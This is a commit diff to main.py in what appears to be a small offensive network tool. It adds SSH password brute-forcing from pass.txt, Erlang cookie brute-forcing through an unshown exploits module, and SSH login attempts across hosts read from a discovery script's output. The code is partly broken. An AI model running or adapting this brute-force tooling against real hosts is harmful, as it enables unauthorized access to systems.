598eea85caec602672350f89aa10bb7896110276
breadforhire <126725193+breadforhire@users.noreply.github.com>
2023-07-24 21:36:05 +0000

    Update main.py

--- main.py
+++ main.py
@@ -1,36 +1,29 @@
 #!/bin/env python
 import sys
 import os
-from sqlite3 import connect 
 import netifaces
 import paramiko
 import subprocess
 import listen as connect_listen
-from sty import fg, bg, ef, rs
-import threading
-from sty import Style, RgbFg
-import getopt
 import logging
-import json
 import exploits
 import main
+import netifaces
 
-netifaces.gateways()
+addrs = netifaces.gateways()
 
 class main(connect_listen.connect_listen):
     def __init__(self, hostname, port, username, password):
         super().__init__(hostname, port, username , password)
         self.networkfile = open("network.txt", "r+")
         self.passfile = open("pass.txt", "r+")
+        self.perf = open("mem.txt", "r+")
 
 
 
     def interface_get(self):
       print(str(addrs.keys()))
-      print(str(netifaces.ifaddresses(str(interfaces[0]))))
-      print(addrs[netifaces.AF_INET])
-      print(addrs[netifaces.AF_LINK])
-
+      print(addrs)
 
     def connect_normal(self):
      print(f'connecting to {self.hostname}')
@@ -40,40 +33,41 @@ class main(connect_listen.connect_listen):
       print("error")
 
     def bruteforce(self):
-     print("... bruteforcing")
+     print(f'...bruteforcing {self.hostname} on port {self.port}')
 
      for password in self.passfile:
       try:
         connect_listen.connect_listen.ssh_connect(self, password, pkey = None)
-        print(password)
+        print(f'[+] {password}')
       except:
+        print(f'[-] {password}')
         pass
 
     def testing_preferences(self):
-      print("... requesting all preferences")
-      my_line = self.myfile.readline()
-      while my_line:
-         connect_listen.connect_listen.preference(self, _pubkeys = self.myfile.readline(), _key = self.myfile.readline(), _compression = self.myfile.readline(), _kex = self.myfile.readline(), _macs = self.myfile.readline())
+      print(f'...requesting preferences {self.hostname} on port {self.port}')
+
+      for p in self.perf:
+       connect_listen.connect_listen.preference(self, _pubkeys = p , _key = p, _compression = p, _kex = p, _macs = p, _cipher = p)
 
 
     def read_network(self):
-     print("reading network") # add a try and except statement
+     print("... reading network")
      os.system("bash discover.sh")
 
      for host in self.networkfile:
       try:
-       print(f'Connecting {host}')
+       print(f'Connecting[+] {host}')
        self.hostname = host
        connect_listen.connect_listen().ssh_connect(passwords = self.password, pkey = self.get_keyfile())
       except:
-        print(f'Connection Failed {host}')
+        print(f'Connection Failed[-] {host}')
         pass
 
 
     def cookie_bruteforce(self):
-     myline = self.myfile.readline()
-     while myline:
+     myline = self.perf.readline()
+     for p in self.perf:
       try:
-       exploits.exploits().erlangcookie(self.network.readline())
+       exploits.exploits(self.hostname, self.port, self.username, self.password).erlangcookie(p)
       except:
           pass
